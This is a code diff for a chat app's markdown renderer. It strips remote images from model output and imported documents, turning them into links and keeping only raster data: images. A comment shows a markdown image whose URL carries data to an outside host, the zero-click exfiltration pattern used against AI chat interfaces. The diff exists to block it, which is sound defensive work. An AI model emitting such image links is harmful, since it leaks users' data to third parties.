@@ -30,8 +30,10 @@ import {
 } from "react";
 import remarkBreaks from "remark-breaks";
 import {
+  defaultRehypePlugins,
   Streamdown,
   type PluginConfig,
+  type StreamdownProps,
 } from "streamdown";
 import { mdComponents } from "@/components/md-blocks";
 import { repairMathForDisplay, transformMathDelimiters } from "@/src/core";
@@ -361,6 +363,88 @@ export const streamdownPlugins = {
 // separate sanitization/hardening and all other Markdown repairs stay enabled.
 export const streamdownRemend = { htmlTags: false };
 
+// Model output and imported documents must not load remote images: a rendered
+// ![x](https://host/?d=...) sends data out with no click. Streamdown's
+// default harden step allows every image prefix, so this keeps its
+// raw → sanitize → harden pipeline and sets allowedImagePrefixes to [], which
+// blocks every <img> that markdown can produce, with four deliberate changes:
+//   - before harden, an image to another site (http(s) or protocol-relative)
+//     becomes a link (its alt text, else its address) that the learner can
+//     open: Streamdown's link button asks before it navigates. Inside an
+//     existing link it becomes plain text instead, never a nested link;
+//   - data: raster images (png, jpeg, gif, webp) display: they make no
+//     network request. The sanitize step is told to keep a data: src, and
+//     harden's own allowDataImages switch (already on in Streamdown's default
+//     options) lets it through; other data: types (svg, html, ...) are dropped
+//     here;
+//   - a kept data: image is reduced to src, alt, title, width and height and
+//     rendered as a bare <img> (md-blocks `img`), not in Streamdown's block
+//     wrapper, which is a <div> and cannot sit inside a <p> or a link;
+//   - relative and same-origin addresses stay blocked: an <img> pointed at
+//     one of the app's own GET routes would call it.
+// The app's own images (figures, drawings, photos, page images) are separate
+// <img> elements that do not render through markdown. The plugins are named
+// explicitly, in the order needed, so a Streamdown upgrade that reorders or
+// adds a default cannot change the pipeline unnoticed (a test pins the
+// default's shape).
+type HastNode = { type: string; tagName?: string; properties?: Record<string, unknown>; children?: HastNode[] };
+
+const RASTER_DATA_IMAGE = /^data:image\/(?:png|jpeg|gif|webp)[;,]/;
+const KEPT_IMAGE_ATTRIBUTES = ["src", "alt", "title", "width", "height"];
+const REMOTE_IMAGE = /^(?:https?:)?\/\/[^/\s]/i;
+
+function imageToLink(root: HastNode): void {
+  const walk = (node: HastNode, inLink: boolean) => {
+    node.children = node.children?.flatMap((child): HastNode[] => {
+      if (child.type !== "element") return [child];
+      // A <source srcset> inside <picture> would load a remote image for a
+      // data: <img> next to it; <picture> adds nothing without it.
+      if (child.tagName === "source") return [];
+      if (child.tagName === "picture") {
+        walk(child, inLink);
+        return child.children ?? [];
+      }
+      if (child.tagName !== "img") {
+        walk(child, inLink || child.tagName === "a");
+        return [child];
+      }
+      const src = String(child.properties?.src ?? "");
+      if (src.startsWith("data:")) {
+        // Harden's own switch would also pass data:image/svg+xml.
+        // A kept image carries only these attributes: id, name, usemap and the
+        // like could clobber document globals (name="body") or reach out
+        // (srcset, longdesc).
+        const kept: Record<string, unknown> = {};
+        for (const key of KEPT_IMAGE_ATTRIBUTES) if (child.properties?.[key] !== undefined) kept[key] = child.properties[key];
+        child.properties = RASTER_DATA_IMAGE.test(src) ? kept : { ...kept, src: "" };
+        return [child];
+      }
+      if (!REMOTE_IMAGE.test(src)) return [child];
+      const href = src.startsWith("//") ? `https:${src}` : src;
+      const alt = String(child.properties?.alt ?? "").trim();
+      const text = { type: "text", value: alt || href } as HastNode;
+      return [inLink ? text : { type: "element", tagName: "a", properties: { href }, children: [text] }];
+    });
+  };
+  walk(root, false);
+}
+
+const { raw, sanitize, harden } = defaultRehypePlugins as Record<"raw" | "sanitize" | "harden", unknown>;
+const [sanitizePlugin, sanitizeSchema] = sanitize as [unknown, { protocols?: Record<string, string[]> }];
+const [hardenPlugin, hardenOptions] = harden as [unknown, Record<string, unknown>];
+export const streamdownRehypePlugins = [
+  raw,
+  [
+    sanitizePlugin,
+    {
+      ...sanitizeSchema,
+      protocols: { ...sanitizeSchema.protocols, src: [...(sanitizeSchema.protocols?.src ?? []), "data"] },
+    },
+  ],
+  () => imageToLink,
+  [hardenPlugin, { ...hardenOptions, allowedImagePrefixes: [], allowDataImages: true }],
+] as NonNullable<StreamdownProps["rehypePlugins"]>;
+
 export const MessageResponse = memo(
   ({ className, children, ...props }: MessageResponseProps) => {
     // Legacy backslash delimiters are converted in a single linear scan;
@@ -381,6 +465,7 @@ export const MessageResponse = memo(
         )}
         components={mdComponents}
         plugins={streamdownPlugins}
+        rehypePlugins={streamdownRehypePlugins}
         remend={streamdownRemend}
         {...props}
       >
